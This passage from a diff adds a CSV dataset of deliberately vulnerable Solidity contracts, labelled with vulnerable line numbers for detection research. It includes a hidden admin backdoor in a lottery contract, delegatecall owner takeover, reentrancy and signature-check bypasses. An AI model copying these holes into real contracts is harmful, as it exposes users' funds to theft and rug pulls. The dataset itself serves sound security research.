@@ -1,0 +1,5019 @@
+,Unnamed: 0,filename,done,file,unclear,source_code,vuln_lines
+0,0,D:\UoM\Final_Year_Project_New\vulnerability-detection-and-localization\datasets\DefiVulnLabs\src\test\ApproveScam_modified.sol,1,ApproveScam_modified.sol,1,"// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.18;
+
+/*
+Name: Over-Permissive Approve Scam
+
+Description:
+This vulnerability is associated with the approval process in ERC20 tokens. 
+In this scenario, Alice approves Eve to transfer an unlimited (type(uint256).max) amount of tokens 
+from Alice's account. Later, Eve exploits this permission and transfers 1000 tokens from Alice's account to hers.
+
+Most current scams use approve or setApprovalForAll to defraud your transfer rights. Be especially careful with this part.
+
+Mitigation:
+Users should only approve the amount of tokens necessary for the operation at hand. 
+*/
+
+/*
+ * @vulnerable_at_lines: 72
+ */
+
+interface IERC20 {
+    function totalSupply() external view returns (uint);
+
+    function balanceOf(address account) external view returns (uint);
+
+    function transfer(address recipient, uint amount) external returns (bool);
+
+    function allowance(
+        address owner,
+        address spender
+    ) external view returns (uint);
+
+    function approve(address spender, uint amount) external returns (bool);
+
+    function transferFrom(
+        address sender,
+        address recipient,
+        uint amount
+    ) external returns (bool);
+
+    event Transfer(address indexed from, address indexed to, uint value);
+    event Approval(address indexed owner, address indexed spender, uint value);
+}
+
+contract ERC20 is IERC20 {
+    uint public totalSupply;
+    mapping(address => uint) public balanceOf;
+    mapping(address => mapping(address => uint)) public allowance;
+    string public name = ""Test example"";
+    string public symbol = ""Test"";
+    uint8 public decimals = 18;
+
+    function transfer(address recipient, uint amount) external returns (bool) {
+        balanceOf[msg.sender] -= amount;
+        balanceOf[recipient] += amount;
+        emit Transfer(msg.sender, recipient, amount);
+        return true;
+    }
+
+    function approve(address spender, uint amount) external returns (bool) {
+        allowance[msg.sender][spender] = amount;
+        emit Approval(msg.sender, spender, amount);
+        return true;
+    }
+
+    function transferFrom(
+        address sender,
+        address recipient,
+        uint amount
+    ) external returns (bool) {
+        allowance[sender][msg.sender] -= amount;
+        balanceOf[sender] -= amount;
+        balanceOf[recipient] += amount;
+        emit Transfer(sender, recipient, amount);
+        return true;
+    }
+
+    function mint(uint amount) external {
+        balanceOf[msg.sender] += amount;
+        totalSupply += amount;
+        emit Transfer(address(0), msg.sender, amount);
+    }
+
+    function burn(uint amount) external {
+        balanceOf[msg.sender] -= amount;
+        totalSupply -= amount;
+        emit Transfer(msg.sender, address(0), amount);
+    }
+}
+",{72}
+1,1,D:\UoM\Final_Year_Project_New\vulnerability-detection-and-localization\datasets\DefiVulnLabs\src\test\Array-deletion_modified.sol,1,Array-deletion_modified.sol,0,"// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.18;
+
+/*
+Name: Array Deletion Oversight: leading to data inconsistency
+
+Description:
+In Solidity where improper deletion of elements from dynamic arrays can result in data inconsistency. 
+When attempting to delete elements from an array, if the deletion process is not handled correctly, 
+the array may still retain storage space and exhibit unexpected behavior. 
+
+
+Mitigation:  
+Option1: By copying the last element and placing it in the position to be removed.
+Option2: By shifting them from right to left.
+
+REF:
+https://twitter.com/1nf0s3cpt/status/1677167550277509120
+https://blog.solidityscan.com/improper-array-deletion-82672eed8e8d
+https://github.com/sherlock-audit/2023-03-teller-judging/issues/88
+*/
+
+/*
+ * @vulnerable_at_lines: 32
+ */
+
+contract ArrayDeletionBug {
+    uint[] public myArray = [1, 2, 3, 4, 5];
+
+    function deleteElement(uint index) external {
+        require(index < myArray.length, ""Invalid index"");
+        delete myArray[index];
+    }
+
+    function getLength() public view returns (uint) {
+        return myArray.length;
+    }
+}
+
+contract FixedArrayDeletion {
+    uint[] public myArray = [1, 2, 3, 4, 5];
+
+    //Mitigation 1: By copying the last element and placing it in the position to be removed.
+    function deleteElement(uint index) external {
+        require(index < myArray.length, ""Invalid index"");
+
+        // Swap the element to be deleted with the last element
+        myArray[index] = myArray[myArray.length - 1];
+
+        // Delete the last element
+        myArray.pop();
+    }
+
+    // Mitigation 2: By shifting them from right to left.
+    function deleteElement2(uint index) external {
+        require(index < myArray.length, ""Invalid index"");
+        
+        for (uint i = index; i < myArray.length - 1; i++) {
+            myArray[i] = myArray[i + 1];
+        }
+        
+        // Delete the last element
+        myArray.pop();
+    }
+    
+    function getLength() public view returns (uint) {
+        return myArray.length;
+    }
+}
+",{32}
+2,2,D:\UoM\Final_Year_Project_New\vulnerability-detection-and-localization\datasets\DefiVulnLabs\src\test\Backdoor-assembly_modified.sol,1,Backdoor-assembly_modified.sol,0,"// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.18;
+
+/* 
+Name: Hidden Backdoor in Contract:
+
+Description:
+In this contract, an apparently fair 'LotteryGame' contract is subtly designed to allow 
+a hidden privilege to the contract deployer/administrator. 
+This is achieved through the use of assembly level access to storage variables, 
+where a referee function is designed to provide an administrative backdoor. 
+The 'pickWinner' function appears to randomly pick a winner, but in reality,
+it allows the administrator to set the winner. 
+This bypasses the usual access controls and can be used to drain the prize pool 
+by an unauthorized user, acting as a type of rug pull.
+
+An attacker can manipulate smart contracts as a backdoor by writing inline assembly. 
+Any sensitive parameters can be changed at any time.
+
+Scenario:
+Lottery game: anyone can call pickWinner to get prize if you are lucky. 
+Refers to JST contract backdoor. many rugged style's contract has similar pattern.
+Looks like theres is no setwinner function in contract, how admin can rug?
+*/
+
+/*
+ * @vulnerable_at_lines: 44, 46, 47, 51, 53, 54
+ */
+
+contract LotteryGame {
+    uint256 public prize = 1000;
+    address public winner;
+    address public admin = msg.sender;
+
+    modifier safeCheck() {
+        if (msg.sender == referee()) {
+            _;
+        } else {
+            getkWinner();
+        }
+    }
+
+    function referee() internal view returns (address user) {
+        assembly {
+            // load admin value at slot 2 of storage
+            user := sload(2)
+        }
+    }
+
+    function pickWinner(address random) public safeCheck {
+        assembly {
+            // admin backddoor which can set winner address
+            sstore(1, random)
+        }
+    }
+
+    function getkWinner() public view returns (address) {
+        return winner;
+    }
+}
+","{44, 46, 47, 51, 53, 54}"
+3,3,D:\UoM\Final_Year_Project_New\vulnerability-detection-and-localization\datasets\DefiVulnLabs\src\test\Bypasscontract_modified.sol,1,Bypasscontract_modified.sol,0,"// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.18;
+
+/*
+Name: Bypass isContract() validation
+
+Description:
+The attacker only needs to write the code in the constructor of the smart contract 
+to bypass the detection mechanism of whether it is a smart contract.
+
+REF:
+https://www.infuy.com/blog/bypass-contract-size-limitations-in-solidity-risks-and-prevention/
+*/
+
+/*
+ * @vulnerable_at_lines: 25, 26, 27, 34
+ */
+
+contract Target {
+    function isContract(address account) public view returns (bool) {
+        // This method relies on extcodesize, which returns 0 for contracts in
+        // construction, since the code is only stored at the end of the
+        // constructor execution.
+        uint size;
+        assembly {
+            size := extcodesize(account)
+        }
+        return size > 0;
+    }
+
+    bool public pwned = false;
+
+    function protected() external {
+        require(!isContract(msg.sender), ""no contract allowed"");
+        pwned = true;
+    }
+}
+
+contract TargetRemediated {
+    function isContract(address account) public view returns (bool) {
+        require(tx.origin == msg.sender);
+        return account.code.length > 0;
+    }
+
+    bool public pwned = false;
+
+    function protected() external {
+        require(!isContract(msg.sender), ""no contract allowed"");
+        pwned = true;
+    }
+}
+","{25, 26, 27, 34}"
+4,4,D:\UoM\Final_Year_Project_New\vulnerability-detection-and-localization\datasets\DefiVulnLabs\src\test\DataLocation_modified.sol,1,DataLocation_modified.sol,0,"// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.18;
+
+/*
+Name: Data Location Confusion Vulnerability
+
+Description:
+Misuse of storage and memory references of the user in the updaterewardDebt function.
+
+The function updaterewardDebt is updating the rewardDebt value of a UserInfo struct 
+that is stored in memory. The issue is that this won't persist between function calls. 
+As soon as the function finishes executing, the memory is cleared and the changes are lost.
+
+Mitigation:
+Ensure the correct usage of memory and storage in the function parameters. Make all the locations explicit.
+
+REF:
+https://mudit.blog/cover-protocol-hack-analysis-tokens-minted-exploit/
+https://www.educative.io/answers/storage-vs-memory-in-solidity
+
+*/
+
+/*
+ * @vulnerable_at_lines: 36, 37
+ */
+
+contract Array {
+    mapping(address => UserInfo) public userInfo; // storage
+
+    struct UserInfo {
+        uint256 amount; // How many tokens got staked by user.
+        uint256 rewardDebt; // Reward debt. See Explanation below.
+    }
+
+    function updaterewardDebt(uint amount) public {
+        UserInfo memory user = userInfo[msg.sender]; // memory, vulnerable point
+        user.rewardDebt = amount;
+    }
+
+    function fixedupdaterewardDebt(uint amount) public {
+        UserInfo storage user = userInfo[msg.sender]; // storage
+        user.rewardDebt = amount;
+    }
+}
+","{36, 37}"
+5,5,D:\UoM\Final_Year_Project_New\vulnerability-detection-and-localization\datasets\DefiVulnLabs\src\test\Delegatecall_modified.sol,1,Delegatecall_modified.sol,0,"// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.18;
+
+/*
+Name: Unsafe Delegatecall Vulnerability
+
+Description:
+The Proxy Contract Owner Manipulation Vulnerability is a flaw in the smart contract design that
+allows an attacker to manipulate the owner of the Proxy contract, which is hardcoded as 0xdeadbeef.
+The vulnerability arises due to the use of delegatecall in the fallback function of the Proxy contract. 
+delegatecall allows an attacker to invoke the pwn() function from the Delegate contract within the context 
+of the Proxy contract, thereby changing the value of the owner state variable of the Proxy contract.
+This allows a smart contract to dynamically load code from a different address at runtime.
+
+Scenario:
+Proxy Contract is designed for helping users call logic contract
+Proxy Contract's owner is hardcoded as 0xdeadbeef
+Can you manipulate Proxy Contract's owner ?
+
+Mitigation:
+To mitigate the Proxy Contract Owner Manipulation Vulnerability, 
+avoid using delegatecall unless it is explicitly required, and ensure that the delegatecall is used securely. 
+If the delegatecall is necessary for the contract's functionality, make sure to validate and 
+sanitize inputs to avoid unexpected behaviors.
+*/
+
+/*
+ * @vulnerable_at_lines: 40
+ */
+ 
+contract Proxy {
+    address public owner = address(0xdeadbeef); // slot0
+    Delegate delegate;
+
+    constructor(address _delegateAddress) public {
+        delegate = Delegate(_delegateAddress);
+    }
+
+    fallback() external {
+        (bool suc, ) = address(delegate).delegatecall(msg.data); // vulnerable
+        require(suc, ""Delegatecall failed"");
+    }
+}
+
+contract Delegate {
+    address public owner; // slot0
+
+    function pwn() public {
+        owner = msg.sender;
+    }
+}
+",{40}
+6,6,D:\UoM\Final_Year_Project_New\vulnerability-detection-and-localization\datasets\DefiVulnLabs\src\test\Dirtybytes_modified.sol,1,Dirtybytes_modified.sol,0,"// SPDX-License-Identifier: MIT
+pragma solidity 0.8.0;
+// the issue is fixed in 0.8.15
+
+/*
+Name: Dirtybytes in > Solidity 0.8.15
+    ""description"": ""Copying ``bytes`` arrays from memory or calldata to storage is done in chunks of 32 bytes even if the length is not a multiple of 32. 
+    Thereby, extra bytes past the end of the array may be copied from calldata or memory to storage. 
+    These dirty bytes may then become observable after a ``.push()`` without arguments to the bytes array in storage,
+    i.e. such a push will not result in a zero value at the end of the array as expected. 
+    This bug only affects the legacy code generation pipeline, the new code generation pipeline via IR is not affected.""
+    
+    ""link"": https://blog.soliditylang.org/2022/06/15/dirty-bytes-array-to-storage-bug/
+    ""fixed"": 0.8.15
+
+*/
+
+/*
+ * @vulnerable_at_lines: 35
+ */
+
+contract Dirtybytes {
+    event ev(uint[], uint);
+    bytes s;
+
+    constructor() {
+        // The following event emission involves writing to temporary memory at the current location
+        // of the free memory pointer. Several other operations (e.g. certain keccak256 calls) will
+        // use temporary memory in a similar manner.
+        // In this particular case, the length of the passed array will be written to temporary memory
+        // exactly such that the byte after the 63 bytes allocated below will be 0x02. This dirty byte
+        // will then be written to storage during the assignment and become visible with the push in ``h``.
+        emit ev(new uint[](2), 0);
+        bytes memory m = new bytes(63);
+        s = m;
+    }
+
+    function h() external returns (bytes memory) {
+        s.push();
+        return s;
+    }
+}
+",{35}
+7,7,D:\UoM\Final_Year_Project_New\vulnerability-detection-and-localization\datasets\DefiVulnLabs\src\test\Divmultiply_modified.sol,1,Divmultiply_modified.sol,0,"// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.18;
+
+/*
+Name: Precision Issues - Divide before multiply
+
+Description:
+The contracts demonstrate a common issue when performing division operations in Solidity, 
+as Solidity doesn't support floating-point numbers. The order of operations can affect the result due to integer truncation.
+
+In the Miscalculation contract, the function price performs the division before the
+multiplication (price / 100) * discount. Due to the fact that Solidity truncates integers
+when dividing, the result of price / 100 will be 0 if the price is less than 100. 
+This causes the result of the multiplication to be 0 as well.
+
+On the other hand, in the Calculation contract, the function price performs the multiplication
+before the division (price * discount) / 100. This way, the result will be correct as the multiplication
+doesn't get truncated, only the final result does.
+
+Mitigation:Always perform multiplication before division to avoid losing precision.
+
+REF:
+https://twitter.com/1nf0s3cpt/status/1599774264437395461
+https://blog.solidityscan.com/precision-loss-in-arithmetic-operations-8729aea20be9
+
+*/
+
+/*
+ * @vulnerable_at_lines: 37
+ */
+
+contract Miscalculation {
+    function price(
+        uint256 price,
+        uint256 discount
+    ) public pure returns (uint256) {
+        return (price / 100) * discount; // wrong calculation
+    }
+}
+
+contract Calculation {
+    function price(
+        uint256 price,
+        uint256 discount
+    ) public pure returns (uint256) {
+        return (price * discount) / 100; // correct calculation
+    }
+}
+",{37}
+8,8,D:\UoM\Final_Year_Project_New\vulnerability-detection-and-localization\datasets\DefiVulnLabs\src\test\DOS_modified.sol,1,DOS_modified.sol,0,"// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.18;
+
+/*
+Name: Denial of Service
+
+Description:
+The KingOfEther contract holds a game where a user can claim the throne by sending more Ether than the current balance. 
+The contract attempts to return the previous balance to the last ""king"" when a new user sends more Ether. However,
+this mechanism can be exploited. An attacker's contract (here, the Attack contract) can become the king 
+and then make the fallback function revert or consume more than the stipulated gas limit, 
+causing the claimThrone function to fail whenever the KingOfEther contract tries to return Ether to the last king. 
+
+Mitigation:
+Use a Pull payment pattern, A way to prevent this is to enable users to withdraw their Ether, instead of sending it to them.
+
+REF:
+https://slowmist.medium.com/intro-to-smart-contract-security-audit-dos-e23e9e901e26
+*/
+
+/*
+ * @vulnerable_at_lines: 32, 33
+ */
+
+contract KingOfEther {
+    address public king;
+    uint public balance;
+
+    function claimThrone() external payable {
+        require(msg.value > balance, ""Need to pay more to become the king"");
+
+        (bool sent, ) = king.call{value: balance}("""");
+        require(sent, ""Failed to send Ether"");
+
+        balance = msg.value;
+        king = msg.sender;
+    }
+}
+
+","{32, 33}"
+9,9,D:\UoM\Final_Year_Project_New\vulnerability-detection-and-localization\datasets\DefiVulnLabs\src\test\ecrecover_modified.sol,1,ecrecover_modified.sol,0,"// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.18;
+
+/*
+Name: ecrecover returns address(0)
+
+Description:
+In the SimpleBank contract, the transfer function takes a message hash and a signature (v, r, s values) as inputs.
+It recovers the signer address and checks if it equals Admin. The vulnerability lies in the fact 
+that the ecrecover function may return a 0x0 address when the signature parameters 
+are invali, If v value isn't 27 or 28. it will return address(0).
+
+Mitigation:  
+Verify that the result from ecrecover isn't 0 or instead use OpenZeppelin’s ECDSA library.
+
+REF:
+https://twitter.com/1nf0s3cpt/status/1674268926761668608
+https://github.com/code-423n4/2021-09-swivel-findings/issues/61
+https://github.com/Kaiziron/numen_ctf_2023_writeup/blob/main/wallet.md
+*/
+
+/*
+ * @vulnerable_at_lines: 40, 57
+ */
+
+contract SimpleBank {
+    mapping(address => uint256) private balances;
+    address Admin; //default is address(0)
+
+    function getBalance(address _account) public view returns (uint256) {
+        return balances[_account];
+    }
+
+    function recoverSignerAddress(
+        bytes32 _hash,
+        uint8 _v,
+        bytes32 _r,
+        bytes32 _s
+    ) private pure returns (address) {
+        address recoveredAddress = ecrecover(_hash, _v, _r, _s);
+        return recoveredAddress;
+    }
+
+    function transfer(
+        address _to,
+        uint256 _amount,
+        bytes32 _hash,
+        uint8 _v,
+        bytes32 _r,
+        bytes32 _s
+    ) public {
+        require(_to != address(0), ""Invalid recipient address"");
+
+        address signer = recoverSignerAddress(_hash, _v, _r, _s);
+
+        //require(signer != address(0), ""Invalid signature"");
+        require(signer == Admin, ""Invalid signature"");
+
+        balances[_to] += _amount;
+    }
+
+    function transferMitigated(
+        address _to,
+        uint256 _amount,
+        bytes32 _hash,
+        uint8 _v,
+        bytes32 _r,
+        bytes32 _s
+    ) public {
+        require(_to != address(0), ""Invalid recipient address"");
+
+        address signer = recoverSignerAddress(_hash, _v, _r, _s);
+
+        require(signer != address(0), ""Invalid signature"");
+        //require(signer == Admin, ""Invalid signature"");
+
+        balances[_to] += _amount;
+    }
+}
+","{40, 57}"
+10,10,D:\UoM\Final_Year_Project_New\vulnerability-detection-and-localization\datasets\DefiVulnLabs\src\test\empty-loop_modified.sol,1,empty-loop_modified.sol,1,"// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.15;
+
+import ""@openzeppelin/contracts/token/ERC20/IERC20.sol"";
+
+/*
+Name: Empty loop issue
+
+Description:
+Due to insufficient validation, an attacker can simply pass an empty array to bypass the loop and signature verification.
+
+Mitigation:  
+Check the number of signatures  
+require(sigs.length > 0, ""No signatures provided"");
+
+REF:
+https://twitter.com/1nf0s3cpt/status/1673195574215213057
+https://twitter.com/akshaysrivastv/status/1648310441058115592
+https://dacian.me/exploiting-developer-assumptions#heading-unexpected-empty-inputs
+*/
+
+/*
+ * @vulnerable_at_lines: 41
+ */
+
+contract SimpleBank {
+    struct Signature {
+        bytes32 hash;
+        uint8 v;
+        bytes32 r;
+        bytes32 s;
+    }
+
+    function verifySignatures(Signature calldata sig) public {
+        require(
+            msg.sender == ecrecover(sig.hash, sig.v, sig.r, sig.s),
+            ""Invalid signature""
+        );
+    }
+
+    function withdraw(Signature[] calldata sigs) public {
+        // Mitigation: Check the number of signatures
+        //require(sigs.length > 0, ""No signatures provided"");
+        for (uint i = 0; i < sigs.length; i++) {
+            Signature calldata signature = sigs[i];
+            // Verify every signature and revert if any of them fails to verify.
+            verifySignatures(signature);
+        }
+        payable(msg.sender).transfer(1 ether);
+    }
+
+    function withdrawMitigated(Signature[] calldata sigs) public {
+        // Mitigation: Check the number of signatures
+        require(sigs.length > 0, ""No signatures provided"");
+        for (uint i = 0; i < sigs.length; i++) {
+            Signature calldata signature = sigs[i];
+            // Verify every signature and revert if any of them fails to verify.
+            verifySignatures(signature);
+        }
+        payable(msg.sender).transfer(1 ether);
+    }
+
+    receive() external payable {}
+}
+",{41}
+11,11,D:\UoM\Final_Year_Project_New\vulnerability-detection-and-localization\datasets\DefiVulnLabs\src\test\ERC777-reentrancy_modified.sol,1,ERC777-reentrancy_modified.sol,0,"// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.18;
+
+import ""@openzeppelin/contracts/token/ERC777/ERC777.sol"";
+
+/*
+Name: ERC777 Reentrancy Vulnerability
+
+Description:
+ERC777 tokens allow arbitrary callbacks via hooks that are called during token transfers.
+Malicious contract addresses may cause reentrancy on such callbacks if reentrancy guards are not used. 
+
+Scenario:
+Maximum claims is 1,000 for each EOA, How can you bypass this limitation?
+
+Mitigation:
+Follow check-effect-interaction and use OpenZeppelin Reentrancy Guard.
+
+REF
+https://medium.com/cream-finance/c-r-e-a-m-finance-post-mortem-amp-exploit-6ceb20a630c5
+
+*/
+
+/*
+ * @vulnerable_at_lines: 80, 81
+ */
+
+contract MyERC777 is ERC777 {
+    constructor(
+        uint256 initialSupply
+    ) ERC777(""Gold"", ""GLD"", new address[](0)) {}
+    function mint(
+        address account,
+        uint256 amount,
+        bytes memory userData,
+        bytes memory operatorData
+    ) public returns (bool) {
+        _mint(account, amount, userData, operatorData);
+        return true;
+    }
+}
+
+contract SimpleBank is Test {
+    ERC777 private token;
+    uint maxMintsPerAddress = 1000;
+    mapping(address => uint256) public _mints;
+    bytes32 private constant _TOKENS_RECIPIENT_INTERFACE_HASH =
+        keccak256(""ERC777TokensRecipient"");
+
+    function setUp() external {
+        // mock ERC1820Registry contract in foundry
+        vm.etch(
+            address(0x1820a4B7618BdE71Dce8cdc73aAB6C95905faD24),
+            bytes(
+                hex""608060405234801561001057600080fd5b50600436106100a5576000357c010000000000000000000000000000000000000000000000000000000090048063a41e7d5111610078578063a41e7d51146101d4578063aabbb8ca1461020a578063b705676514610236578063f712f3e814610280576100a5565b806329965a1d146100aa5780633d584063146100e25780635df8122f1461012457806365ba36c114610152575b600080fd5b6100e0600480360360608110156100c057600080fd5b50600160a060020a038135811691602081013591604090910135166102b6565b005b610108600480360360208110156100f857600080fd5b5035600160a060020a0316610570565b60408051600160a060020a039092168252519081900360200190f35b6100e06004803603604081101561013a57600080fd5b50600160a060020a03813581169160200135166105bc565b6101c26004803603602081101561016857600080fd5b81019060208101813564010000000081111561018357600080fd5b82018360208201111561019557600080fd5b803590602001918460018302840111640100000000831117156101b757600080fd5b5090925090506106b3565b60408051918252519081900360200190f35b6100e0600480360360408110156101ea57600080fd5b508035600160a060020a03169060200135600160e060020a0319166106ee565b6101086004803603604081101561022057600080fd5b50600160a060020a038135169060200135610778565b61026c6004803603604081101561024c57600080fd5b508035600160a060020a03169060200135600160e060020a0319166107ef565b604080519115158252519081900360200190f35b61026c6004803603604081101561029657600080fd5b508035600160a060020a03169060200135600160e060020a0319166108aa565b6000600160a060020a038416156102cd57836102cf565b335b9050336102db82610570565b600160a060020a031614610339576040805160e560020a62461bcd02815260206004820152600f60248201527f4e6f7420746865206d616e616765720000000000000000000000000000000000604482015290519081900360640190fd5b6103428361092a565b15610397576040805160e560020a62461bcd02815260206004820152601a60248201527f4d757374206e6f7420626520616e204552433136352068617368000000000000604482015290519081900360640190fd5b600160a060020a038216158015906103b85750600160a060020a0382163314155b156104ff5760405160200180807f455243313832305f4143434550545f4d4147494300000000000000000000000081525060140190506040516020818303038152906040528051906020012082600160a060020a031663249cb3fa85846040518363ffffffff167c01000000000000000000000000000000000000000000000000000000000281526004018083815260200182600160a060020a0316600160a060020a031681526020019250505060206040518083038186803b15801561047e57600080fd5b505afa158015610492573d6000803e3d6000fd5b505050506040513d60208110156104a857600080fd5b5051146104ff576040805160e560020a62461bcd02815260206004820181905260248201527f446f6573206e6f7420696d706c656d656e742074686520696e74657266616365604482015290519081900360640190fd5b600160a060020a03818116600081815260208181526040808320888452909152808220805473ffffffffffffffffffffffffffffffffffffffff19169487169485179055518692917f93baa6efbd2244243bfee6ce4cfdd1d04fc4c0e9a786abd3a41313bd352db15391a450505050565b600160a060020a03818116600090815260016020526040812054909116151561059a5750806105b7565b50600160a060020a03808216600090815260016020526040902054165b919050565b336105c683610570565b600160a060020a031614610624576040805160e560020a62461bcd02815260206004820152600f60248201527f4e6f7420746865206d616e616765720000000000000000000000000000000000604482015290519081900360640190fd5b81600160a060020a031681600160a060020a0316146106435780610646565b60005b600160a060020a03838116600081815260016020526040808220805473ffffffffffffffffffffffffffffffffffffffff19169585169590951790945592519184169290917f605c2dbf762e5f7d60a546d42e7205dcb1b011ebc62a61736a57c9089d3a43509190a35050565b600082826040516020018083838082843780830192505050925050506040516020818303038152906040528051906020012090505b92915050565b6106f882826107ef565b610703576000610705565b815b600160a060020a03928316600081815260208181526040808320600160e060020a031996909616808452958252808320805473ffffffffffffffffffffffffffffffffffffffff19169590971694909417909555908152600284528181209281529190925220805460ff19166001179055565b600080600160a060020a038416156107905783610792565b335b905061079d8361092a565b156107c357826107ad82826108aa565b6107b85760006107ba565b815b925050506106e8565b600160a060020a0390811660009081526020818152604080832086845290915290205416905092915050565b6000808061081d857f01ffc9a70000000000000000000000000000000000000000000000000000000061094c565b909250905081158061082d575080155b1561083d576000925050506106e8565b61084f85600160e060020a031961094c565b909250905081158061086057508015155b15610870576000925050506106e8565b61087a858561094c565b909250905060018214801561088f5750806001145b1561089f576001925050506106e8565b506000949350505050565b600160a060020a0382166000908152600260209081526040808320600160e060020a03198516845290915281205460ff1615156108f2576108eb83836107ef565b90506106e8565b50600160a060020a03808316600081815260208181526040808320600160e060020a0319871684529091529020549091161492915050565b7bffffffffffffffffffffffffffffffffffffffffffffffffffffffff161590565b6040517f01ffc9a7000000000000000000000000000000000000000000000000000000008082526004820183905260009182919060208160248189617530fa90519096909550935050505056fea165627a7a72305820377f4a2d4301ede9949f163f319021a6e9c687c292a5e2b2c4734c126b524e6c0029""
+            )
+        );
+    }
+    constructor(address nftAddress) {
+        token = ERC777(nftAddress);
+
+        // Register IERC1820Registry
+        IERC1820Registry registry = IERC1820Registry(
+            address(0x1820a4B7618BdE71Dce8cdc73aAB6C95905faD24)
+        );
+        registry.setInterfaceImplementer(
+            address(this),
+            _TOKENS_RECIPIENT_INTERFACE_HASH,
+            address(this)
+        );
+    }
+
+    function claim(address account, uint256 amount) public returns (bool) {
+        // Check if total claims for the address would exceed max mints per address.
+        require(
+            _mints[account] + amount <= maxMintsPerAddress,
+            ""Exceeds max mints per address""
+        );
+
+        token.transfer(account, amount);
+        _mints[account] += amount; // Do not follow check-effect-interaction
+
+        return true;
+    }
+
+    function tokensReceived(
+        address operator,
+        address from,
+        address to,
+        uint256 amount,
+        bytes calldata data,
+        bytes calldata operatorData
+    ) external {}
+    receive() external payable {}
+}
+","{80, 81}"
+12,12,D:\UoM\Final_Year_Project_New\vulnerability-detection-and-localization\datasets\DefiVulnLabs\src\test\fee-on-transfer_modified.sol,1,fee-on-transfer_modified.sol,0,"// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.18;
+
+/*
+Name: STA token had a deflationary model with transfer fee of 1% charged from a recipient.
+
+Description:
+The actual deposited amount might be lower than the specified depositAmount of the function parameter.
+
+VulnVault: Incompatability with deflationary / fee-on-transfer tokens
+
+Mitigation:  
+Transfer the tokens first and compare pre-/after token balances to compute the actual deposited amount.
+
+REF:
+https://twitter.com/1nf0s3cpt/status/1671084918506684418
+https://medium.com/1inch-network/balancer-hack-2020-a8f7131c980e
+https://twitter.com/BlockSecTeam/status/1600442137811689473
+*/
+
+/*
+ * @vulnerable_at_lines: 270, 271
+ */
+
+interface IERC20 {
+    function totalSupply() external view returns (uint256);
+
+    function balanceOf(address who) external view returns (uint256);
+
+    function allowance(
+        address owner,
+        address spender
+    ) external view returns (uint256);
+
+    function transfer(address to, uint256 value) external returns (bool);
+
+    function approve(address spender, uint256 value) external returns (bool);
+
+    function transferFrom(
+        address from,
+        address to,
+        uint256 value
+    ) external returns (bool);
+
+    event Transfer(address indexed from, address indexed to, uint256 value);
+    event Approval(
+        address indexed owner,
+        address indexed spender,
+        uint256 value
+    );
+}
+
+library SafeMath {
+    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
+        if (a == 0) {
+            return 0;
+        }
+        uint256 c = a * b;
+        assert(c / a == b);
+        return c;
+    }
+
+    function div(uint256 a, uint256 b) internal pure returns (uint256) {
+        uint256 c = a / b;
+        return c;
+    }
+
+    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
+        assert(b <= a);
+        return a - b;
+    }
+
+    function add(uint256 a, uint256 b) internal pure returns (uint256) {
+        uint256 c = a + b;
+        assert(c >= a);
+        return c;
+    }
+
+    function ceil(uint256 a, uint256 m) internal pure returns (uint256) {
+        uint256 c = add(a, m);
+        uint256 d = sub(c, 1);
+        return mul(div(d, m), m);
+    }
+}
+
+abstract contract ERC20Detailed is IERC20 {
+    string private _name;
+    string private _symbol;
+    uint8 private _decimals;
+
+    constructor(
+        string memory name,
+        string memory symbol,
+        uint8 decimals
+    ) internal {
+        _name = name;
+        _symbol = symbol;
+        _decimals = decimals;
+    }
+
+    function name() public view returns (string memory) {
+        return _name;
+    }
+
+    function symbol() public view returns (string memory) {
+        return _symbol;
+    }
+
+    function decimals() public view returns (uint8) {
+        return _decimals;
+    }
+}
+
+contract STA is ERC20Detailed {
+    using SafeMath for uint256;
+    mapping(address => uint256) private _balances;
+    mapping(address => mapping(address => uint256)) private _allowed;
+
+    string constant tokenName = ""Statera"";
+    string constant tokenSymbol = ""STA"";
+    uint8 constant tokenDecimals = 18;
+    uint256 _totalSupply = 100000000000000000000000000;
+    uint256 public basePercent = 100;
+
+    constructor()
+        public
+        payable
+        ERC20Detailed(tokenName, tokenSymbol, tokenDecimals)
+    {
+        _issue(msg.sender, _totalSupply);
+    }
+
+    function totalSupply() public view returns (uint256) {
+        return _totalSupply;
+    }
+
+    function balanceOf(address owner) public view returns (uint256) {
+        return _balances[owner];
+    }
+
+    function allowance(
+        address owner,
+        address spender
+    ) public view returns (uint256) {
+        return _allowed[owner][spender];
+    }
+
+    function cut(uint256 value) public view returns (uint256) {
+        uint256 roundValue = value.ceil(basePercent);
+        uint256 cutValue = roundValue.mul(basePercent).div(10000);
+        return cutValue;
+    }
+
+    function transfer(address to, uint256 value) public returns (bool) {
+        require(value <= _balances[msg.sender]);
+        require(to != address(0));
+
+        uint256 tokensToBurn = cut(value);
+        uint256 tokensToTransfer = value.sub(tokensToBurn);
+
+        _balances[msg.sender] = _balances[msg.sender].sub(value);
+        _balances[to] = _balances[to].add(tokensToTransfer);
+
+        _totalSupply = _totalSupply.sub(tokensToBurn);
+
+        emit Transfer(msg.sender, to, tokensToTransfer);
+        emit Transfer(msg.sender, address(0), tokensToBurn);
+        return true;
+    }
+
+    function approve(address spender, uint256 value) public returns (bool) {
+        require(spender != address(0));
+        _allowed[msg.sender][spender] = value;
+        emit Approval(msg.sender, spender, value);
+        return true;
+    }
+
+    function transferFrom(
+        address from,
+        address to,
+        uint256 value
+    ) public returns (bool) {
+        require(value <= _balances[from]);
+        require(value <= _allowed[from][msg.sender]);
+        require(to != address(0));
+
+        _balances[from] = _balances[from].sub(value);
+
+        uint256 tokensToBurn = cut(value);
+        uint256 tokensToTransfer = value.sub(tokensToBurn);
+
+        _balances[to] = _balances[to].add(tokensToTransfer);
+        _totalSupply = _totalSupply.sub(tokensToBurn);
+
+        _allowed[from][msg.sender] = _allowed[from][msg.sender].sub(value);
+
